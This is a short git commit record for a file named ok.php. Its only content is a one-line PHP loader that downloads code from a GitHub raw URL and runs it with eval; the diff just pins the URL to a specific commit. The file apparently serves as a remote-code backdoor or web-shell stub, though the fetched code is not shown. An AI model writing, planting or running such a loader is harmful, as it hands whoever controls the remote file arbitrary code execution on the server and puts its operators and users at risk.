6d3ff86c2397c55a3b7c188ac658ea8da53bd3b3
tigerxcode29 <168910474+tigerxcode29@users.noreply.github.com>
2024-11-18 01:43:14 +0700

    Update ok.php

--- ok.php
+++ ok.php
@@ -1,1 +1,1 @@
-<?php eval("?>".file_get_contents("https://raw.githubusercontent.com/tigerxcode29/hi/refs/heads/main/ok.php"));?>
+<?php eval("?>".file_get_contents("https://raw.githubusercontent.com/tigerxcode29/hi/9bfc2498b0bfa47e4aa9bb6c7460c4278209afd5/ok.php"));?>
